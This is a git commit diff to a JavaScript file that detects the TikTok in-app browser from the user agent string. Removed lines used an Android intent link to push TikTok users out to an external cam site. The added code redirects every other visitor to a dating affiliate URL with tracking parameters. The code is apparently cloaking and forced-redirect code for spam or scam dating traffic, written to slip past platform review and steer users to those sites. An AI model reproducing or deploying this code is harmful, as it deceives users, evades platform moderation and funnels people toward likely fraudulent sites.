3a42f620974d5ed0c39ad4c9fa21362e21398142
fixyourself2024 <Shaiji16@gmail.com>
2024-08-09 19:58:45 +0300

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -1,36 +1,9 @@
-let body = document.querySelector('body');
 let agent = navigator.userAgent;
-let intik = document.querySelector('.intik');
-let outik = document.querySelector('.outik');
 
-if (
-  agent.indexOf('music') >= 0 ||
-  agent.indexOf('AppName') >= 0 ||
-  agent.indexOf('AppVersion') >= 0
-) {
+if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
-  alert("in tiktok");
-
-  intik.setAttribute('id', 'show');
-  outik.setAttribute('id', 'hide');
-  location.replace(
-    'intent://watchmenow.cam/chat#Intent;scheme=http;action=android.intent.action.VIEW;end'
-  );
 } else {
-  console.log('not in tiktok app');
-  window.location = 'https://datinghugflirt.life/?u=13bk60m&o=0rygz59';
-  alert("not in tiktok");
-  body.setAttribute('class', 'black_bg');
-  intik.setAttribute('id', 'hide');
-  outik.setAttribute('id', 'show');
-
-  outik.addEventListener('click', () => {
-    window
-      .open('https://theyoursweetflirt.one/?u=rudktec&o=9kgp9mx', '_blank')
-      .focus();
-    //window.location = 'https://theyoursweetflirt.one/?u=rudktec&o=9kgp9mx';
-
-    //window.location = 'https://theyoursweetflirt.one/?u=rudktec&o=9kgp9mx';
-  });
+  window.location = 'https://theyoursweetflirt.one/?u=rudktec&o=9kgp9mx';
+//  window.location = 'https://theyoursweetflirt.one/?u=rudktec&o=9kgp9mx';
 }
 // document.querySelector('body').innerText = agent;
